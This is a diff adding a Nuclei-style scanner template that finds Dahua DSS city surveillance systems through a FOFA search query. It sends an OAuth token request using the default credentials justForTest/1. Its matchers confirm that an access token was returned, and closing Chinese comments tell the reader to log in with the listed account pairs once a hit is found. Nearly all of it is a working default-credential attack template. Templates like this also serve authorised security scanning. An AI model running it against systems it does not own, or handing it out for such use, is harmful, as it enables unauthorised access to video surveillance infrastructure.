@@ -1,0 +1,36 @@
+id: dahua-dss-default-login-0
+info:
+  name: 大华 DSS 城市安防监控系统 - default login
+  author: leadlife
+  severity: high
+  description: 
+  metadata:
+    verified: true
+    fofa-query: body="/portal/include/script/dahuaDefined/headCommon.js?type=index" && title="DSS" || app="dahua-DSS"
+    hunter-query: demo
+  tags: dahua,dss,default-login,iot
+
+http:
+  - raw:
+      - |
+        POST /evo-apigw/evo-oauth/oauth/token HTTP/2
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: keep-alive
+        Content-Length: 109
+
+        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+                
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','access_token','refresh_token')
+        condition: and
+
+
+# justForTest/justForTest
+# justForTest/1
+# 发现漏洞后，直接尝试上述账户密码登入
